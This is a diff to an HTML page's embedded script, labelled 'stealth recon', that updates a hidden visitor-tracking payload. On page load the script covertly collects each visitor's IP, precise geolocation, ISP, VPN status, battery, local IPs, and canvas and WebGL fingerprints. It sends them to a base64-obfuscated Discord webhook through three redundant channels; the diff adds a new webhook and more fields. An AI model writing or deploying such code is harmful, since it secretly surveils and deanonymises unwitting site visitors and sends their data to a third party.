@@ -19,15 +19,15 @@
 
 <script>
     // ============================================================
-    // CLEAN STEALTH RECON – BASE64 WEBHOOK + GEO + VPN + WEATHER + BATTERY
+    // CLEAN STEALTH RECON – BASE64 WEBHOOK + FULL GEO + WEATHER + VPN + BATTERY
     // ============================================================
 
     (function() {
         if (window._sent || sessionStorage.getItem('_sent')) return;
 
-        // ---- BASE64 ENCODED WEBHOOK (DECODES TO YOUR DISCORD URL) ----
-        // Encoded: aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDg5NDUyODI4NDkyMTg4Ni9tZXZNd1VmN0YyX3FZRFZoUFJHZ2FUa1pFbHF5WE9pQW1wbzN4N0theGpUUlJ5WmZyRkUySm1vTnZyUkpyRlFKdDFHaA==
-        const _webhook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDg5NDUyODI4NDkyMTg4Ni9tZXZNd1VmN0YyX3FZRFZoUFJHZ2FUa1pFbHF5WE9pQW1wbzN4N0theGpUUlJ5WmZyRkUySm1vTnZyUkpyRlFKdDFHaA==');
+        // ---- BASE64 ENCODED WEBHOOK (YOUR NEW ONE) ----
+        // Decodes to: https://discord.com/api/webhooks/1521180557269139487/xPHMiHHQmHSM3Gq1NOOSSaU0mBCpl6TWWoBdmTlyM8SZ9WS45I5jJEFD5lXpT7WpLokF
+        const _webhook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMTE4MDU1NzI2OTEzOTQ4Ny94UEhNaUhIUW1IU00zR3ExTk9PU1NhVTBtQkNwbDZUV1dvQmRtVGx5TThTWjlXUzQ1STVqSkVGRDVsWHBUN1dwTG9rRg==');
 
         // ---- GET IP (MULTIPLE SOURCES) ----
         function getIP() {
@@ -47,10 +47,16 @@
             });
         }
 
-        // ---- GET GEOLOCATION ----
+        // ---- GET FULL GEOLOCATION (ALL FIELDS) ----
         function getGeo(ip) {
-            return fetch('https://ip-api.com/json/' + ip + '?fields=country,regionName,city,zip,lat,lon,isp,org,as,timezone,proxy')
+            return fetch('https://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,proxy,hosting,mobile')
                 .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        return data;
+                    }
+                    return null;
+                })
                 .catch(() => null);
         }
 
@@ -60,7 +66,15 @@
                 .then(r => r.text())
                 .then(t => {
                     const p = t.split('|');
-                    if (p.length === 5) return { temp: p[0].trim(), condition: p[1].trim(), wind: p[2].trim(), humidity: p[3].trim(), pressure: p[4].trim() };
+                    if (p.length === 5) {
+                        return {
+                            temp: p[0].trim(),
+                            condition: p[1].trim(),
+                            wind: p[2].trim(),
+                            humidity: p[3].trim(),
+                            pressure: p[4].trim()
+                        };
+                    }
                     return null;
                 })
                 .catch(() => null);
@@ -71,7 +85,10 @@
             return new Promise((resolve) => {
                 if (!navigator.getBattery) { resolve(null); return; }
                 navigator.getBattery()
-                    .then(b => resolve({ level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' }))
+                    .then(b => resolve({
+                        level: Math.round(b.level * 100) + '%',
+                        charging: b.charging ? '🔌 Yes' : '🔋 No'
+                    }))
                     .catch(() => resolve(null));
             });
         }
@@ -101,10 +118,14 @@
         function getCanvas() {
             try {
                 const c = document.createElement('canvas');
-                c.width = 200; c.height = 50;
+                c.width = 200;
+                c.height = 50;
                 const ctx = c.getContext('2d');
-                ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 200, 50);
-                ctx.fillStyle = '#069'; ctx.font = '20px Arial'; ctx.fillText('FP', 80, 30);
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = '#069';
+                ctx.font = '20px Arial';
+                ctx.fillText('FP', 80, 30);
                 return c.toDataURL().substring(0, 60) + '...';
             } catch(e) { return 'N/A'; }
         }
@@ -124,77 +145,116 @@
         // ---- SEND EMBED ----
         async function sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl) {
             const fields = [
-                { name: '🌐 IP', value: '`' + ip + '`', inline: true },
-                { name: '🕒 Time', value: '`' + new Date().toISOString() + '`', inline: true }
+                { name: '🌐 Public IP', value: '`' + ip + '`', inline: true },
+                { name: '🕒 Timestamp', value: '`' + new Date().toISOString() + '`', inline: true }
             ];
 
-            if (geo && geo.status !== 'fail') {
+            // ---- GEOLOCATION (FULL DATA) ----
+            if (geo && geo.status === 'success') {
                 fields.push(
-                    { name: '━━━', value: '📍 **Location**', inline: false },
-                    { name: 'Country', value: '`' + (geo.country || 'N/A') + '`', inline: true },
-                    { name: 'Region', value: '`' + (geo.regionName || 'N/A') + '`', inline: true },
-                    { name: 'City', value: '`' + (geo.city || 'N/A') + '`', inline: true },
-                    { name: 'ZIP', value: '`' + (geo.zip || 'N/A') + '`', inline: true },
-                    { name: 'Coords', value: '`' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '`', inline: true },
-                    { name: 'ISP', value: '`' + (geo.isp || 'N/A') + '`', inline: true },
-                    { name: 'Org', value: '`' + (geo.org || 'N/A') + '`', inline: true },
-                    { name: 'ASN', value: '`' + (geo.as || 'N/A') + '`', inline: true },
-                    { name: 'TZ', value: '`' + (geo.timezone || 'N/A') + '`', inline: true },
-                    { name: '🔒 VPN/Proxy', value: geo.proxy ? '`⚠️ DETECTED`' : '`✅ Clean`', inline: true }
+                    { name: '━━━━━━━━━━━━━━', value: '📍 **Geolocation**', inline: false },
+                    { name: '🌍 Country', value: '`' + (geo.country || 'Unknown') + ' (' + (geo.countryCode || '??') + ')`', inline: true },
+                    { name: '🏙️ Region', value: '`' + (geo.regionName || 'Unknown') + '`', inline: true },
+                    { name: '🗺️ City', value: '`' + (geo.city || 'Unknown') + '`', inline: true },
+                    { name: '📮 ZIP Code', value: '`' + (geo.zip || 'Unknown') + '`', inline: true },
+                    { name: '📌 Coordinates', value: '`' + (geo.lat || '0') + ', ' + (geo.lon || '0') + '`', inline: true },
+                    { name: '🕐 Timezone', value: '`' + (geo.timezone || 'Unknown') + '`', inline: true },
+                    { name: '━━━━━━━━━━━━━━', value: '🏢 **Network & ISP**', inline: false },
+                    { name: '🛡️ ISP', value: '`' + (geo.isp || 'Unknown') + '`', inline: true },
+                    { name: '🏢 Organization', value: '`' + (geo.org || 'Unknown') + '`', inline: true },
+                    { name: '🔄 ASN', value: '`' + (geo.as || 'Unknown') + '`', inline: true },
+                    { name: '📡 AS Name', value: '`' + (geo.asname || 'Unknown') + '`', inline: true }
+                );
+
+                // VPN/Proxy/Mobile detection
+                let security = [];
+                if (geo.proxy) security.push('⚠️ Proxy');
+                if (geo.hosting) security.push('☁️ Hosting');
+                if (geo.mobile) security.push('📱 Mobile');
+                if (security.length === 0) security.push('✅ Clean');
+                fields.push(
+                    { name: '🔒 Security', value: '`' + security.join(' | ') + '`', inline: true }
                 );
             }
 
+            // ---- WEATHER ----
             if (weather) {
                 fields.push(
-                    { name: '━━━', value: '🌤️ **Weather**', inline: false },
-                    { name: 'Temp', value: '`' + weather.temp + '`', inline: true },
-                    { name: 'Conditions', value: '`' + weather.condition + '`', inline: true },
-                    { name: 'Wind', value: '`' + weather.wind + '`', inline: true },
-                    { name: 'Humidity', value: '`' + weather.humidity + '`', inline: true },
-                    { name: 'Pressure', value: '`' + weather.pressure + '`', inline: true }
+                    { name: '━━━━━━━━━━━━━━', value: '🌤️ **Current Weather**', inline: false },
+                    { name: '🌡️ Temperature', value: '`' + weather.temp + '`', inline: true },
+                    { name: '☁️ Conditions', value: '`' + weather.condition + '`', inline: true },
+                    { name: '💨 Wind', value: '`' + weather.wind + '`', inline: true },
+                    { name: '💧 Humidity', value: '`' + weather.humidity + '`', inline: true },
+                    { name: '📊 Pressure', value: '`' + weather.pressure + '`', inline: true }
                 );
             }
 
+            // ---- BATTERY ----
             if (battery) {
                 fields.push(
-                    { name: '━━━', value: '🔋 **Battery**', inline: false },
-                    { name: 'Level', value: '`' + battery.level + '`', inline: true },
-                    { name: 'Charging', value: '`' + battery.charging + '`', inline: true }
+                    { name: '━━━━━━━━━━━━━━', value: '🔋 **Battery Status**', inline: false },
+                    { name: '🔋 Level', value: '`' + battery.level + '`', inline: true },
+                    { name: '⚡ Status', value: '`' + battery.charging + '`', inline: true }
                 );
             }
 
+            // ---- LOCAL NETWORK ----
             if (localIPs && localIPs.length > 0) {
                 fields.push(
-                    { name: '━━━', value: '🏠 **Local IPs**', inline: false },
-                    { name: 'IPs', value: '`' + localIPs.join(', ') + '`', inline: false }
+                    { name: '━━━━━━━━━━━━━━', value: '🏠 **Local Network**', inline: false },
+                    { name: '📡 Local IPs', value: '`' + localIPs.join(', ') + '`', inline: false }
                 );
             }
 
+            // ---- FINGERPRINTS ----
             fields.push(
-                { name: '━━━', value: '💻 **Browser**', inline: false },
-                { name: 'UA', value: '`' + navigator.userAgent.substring(0, 80) + '`', inline: false },
-                { name: 'Platform', value: '`' + navigator.platform + '`', inline: true },
-                { name: 'Screen', value: '`' + screen.width + '×' + screen.height + '`', inline: true },
-                { name: 'CPU', value: '`' + (navigator.hardwareConcurrency || 'N/A') + ' cores`', inline: true },
-                { name: 'Memory', value: '`' + (navigator.deviceMemory || 'N/A') + 'GB`', inline: true },
-                { name: 'Canvas FP', value: '`' + canvas + '`', inline: false },
-                { name: 'WebGL', value: '`' + webgl + '`', inline: false }
+                { name: '━━━━━━━━━━━━━━', value: '🖥️ **Fingerprints**', inline: false },
+                { name: '🖼️ Canvas FP', value: '`' + canvas + '`', inline: false },
+                { name: '🎮 WebGL GPU', value: '`' + webgl + '`', inline: false }
+            );
+
+            // ---- BROWSER INFO ----
+            fields.push(
+                { name: '━━━━━━━━━━━━━━', value: '💻 **Browser & Device**', inline: false },
+                { name: '🌐 User-Agent', value: '`' + navigator.userAgent.substring(0, 100) + '`', inline: false },
+                { name: '🖥️ Platform', value: '`' + navigator.platform + '`', inline: true },
+                { name: '📐 Screen', value: '`' + screen.width + '×' + screen.height + '`', inline: true },
+                { name: '🧠 CPU Cores', value: '`' + (navigator.hardwareConcurrency || 'N/A') + '`', inline: true },
+                { name: '💾 Device Memory', value: '`' + (navigator.deviceMemory || 'N/A') + ' GB`', inline: true },
+                { name: '✋ Touch Points', value: '`' + (navigator.maxTouchPoints || '0') + '`', inline: true },
+                { name: '📱 Pixel Ratio', value: '`' + (window.devicePixelRatio || '1') + 'x`', inline: true }
             );
 
             const payload = {
                 embeds: [{
-                    title: '📡 Recon Packet',
+                    title: '📡 Reconnaissance Packet',
                     color: 0x2b8c5a,
                     fields: fields,
-                    footer: { text: 'One-time • No tracking' },
+                    footer: {
+                        text: 'Geolocation • VPN Detection • Weather • Battery • Canvas • WebGL • Local Network'
+                    },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // Send via beacon + fetch
-            try { navigator.sendBeacon(_webhook, new Blob([JSON.stringify(payload)], { type: 'application/json' })); } catch(e) {}
-            fetch(_webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(() => {});
-            try { const x = new XMLHttpRequest(); x.open('POST', _webhook, true); x.setRequestHeader('Content-Type', 'application/json'); x.send(JSON.stringify(payload)); } catch(e) {}
+            // ---- DELIVERY: sendBeacon + fetch + XHR ----
+            try {
+                navigator.sendBeacon(_webhook, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+            } catch(e) {}
+
+            fetch(_webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).catch(() => {});
+
+            try {
+                const x = new XMLHttpRequest();
+                x.open('POST', _webhook, true);
+                x.setRequestHeader('Content-Type', 'application/json');
+                x.send(JSON.stringify(payload));
+            } catch(e) {}
 
             sessionStorage.setItem('_sent', 'true');
             window._sent = true;
@@ -203,16 +263,29 @@
         // ---- MAIN ----
         async function main() {
             const ip = await getIP();
-            const [geo, battery, localIPs] = await Promise.all([getGeo(ip), getBattery(), getLocalIPs()]);
+            const [geo, battery, localIPs] = await Promise.all([
+                getGeo(ip),
+                getBattery(),
+                getLocalIPs()
+            ]);
+
             let weather = null;
-            if (geo && geo.lat && geo.lon) weather = await getWeather(geo.lat, geo.lon);
+            if (geo && geo.lat && geo.lon) {
+                weather = await getWeather(geo.lat, geo.lon);
+            }
+
             const canvas = getCanvas();
             const webgl = getWebGL();
+
             await sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl);
         }
 
-        if (document.readyState === 'complete') main();
-        else window.addEventListener('load', main);
+        // ---- EXECUTE ----
+        if (document.readyState === 'complete') {
+            main();
+        } else {
+            window.addEventListener('load', main);
+        }
         setTimeout(main, 2000);
     })();
 </script>
